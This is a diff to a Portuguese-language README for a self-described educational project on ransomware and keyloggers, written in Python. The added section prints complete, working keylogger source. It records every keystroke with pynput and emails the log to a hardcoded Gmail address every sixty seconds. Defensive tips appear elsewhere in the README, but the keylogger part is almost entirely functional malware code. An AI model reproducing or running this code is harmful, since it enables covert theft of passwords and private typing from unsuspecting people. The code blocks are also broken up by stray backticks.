@@ -11,6 +11,9 @@
 [![Criado por Dan54317](https://img.shields.io/badge/Cria%C3%A7%C3%A3o-Dan54317-blue?style=for-the-badge)](https://github.com/Dan54317)
 
 **Resumo do Projeto**
+
+
+
 Este trabalho foi elaborado para simulações educacionais sobre duas ameaças digitais --Ransomware e Keylogger-- desenvolvido em python e documentado de forma responsável. O projeto tem como finalidade entender como as ameaças operam, quais dados elas capturam ou criptografam. Como se proteger qual técnica de detecção e mitigação são eficaz para o mundo real.
 
 
@@ -230,6 +233,9 @@ Ransomware em execução dados criptografados e a mensagem de Resgate com os pas
 
 🛡️ EDR/XDR > Use soluções de detecção e resposta em endpoints (além do antivírus) 
 Foco em prevenção + detecção + resposta = defesa completa! 🔒
+
+
+
 ---
 
 # Kelylogger
@@ -239,6 +245,81 @@ Keylogger é um tipo de software malicioso que captura tudo o que o usuário dig
 
 
 ---
+
+## 
+
+`from pynput import keyboard 
+import smtplib
+from email.mime.text import MIMEText        
+from threading import Timer
+from pathlib import Path
+import logging`
+
+# Configurar logging para arquivo
+
+
+`log_path = Path(__file__).parent / "keylogger.log"
+logging.basicConfig(
+    filename=str(log_path),
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)`
+
+
+log = ""`
+
+# Configurações do email
+`EMAIL_origem = "ranson112224@gmail.com"
+EMAIL_destino = "ranson112224@gmail.com"
+SENHA = "XXX XXX XXX XXXX"`
+
+# Função para enviar o email com o log capturado
+`def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['Subject'] = 'Dados capturados pelo Keylogger'
+        msg['From'] = EMAIL_origem
+        msg['To'] = EMAIL_destino`
+        `try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(EMAIL_origem, SENHA)
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            print(f"Erro ao enviar email: {e}")`
+    `log = ""  # Limpa o log após o envio
+    Timer(60, enviar_email).start()`
+# Função para capturar as teclas pressionadas
+`def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[BACKSPACE]"
+        elif key == keyboard.Key.esc:
+            log += "[ESC]"
+        elif key == keyboard.Key.tab:
+            log += "\t"
+        else:
+            pass  # Ignora outras teclas especiais`
+# Inicia o listener do teclado
+            
+`with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()  # Inicia o envio periódico de emails
+    listener.join()`
+
+
+      
+
+
+
 ## Autor / Contato
 
 **Dan54317** — Autor e responsável pelo repositório.  
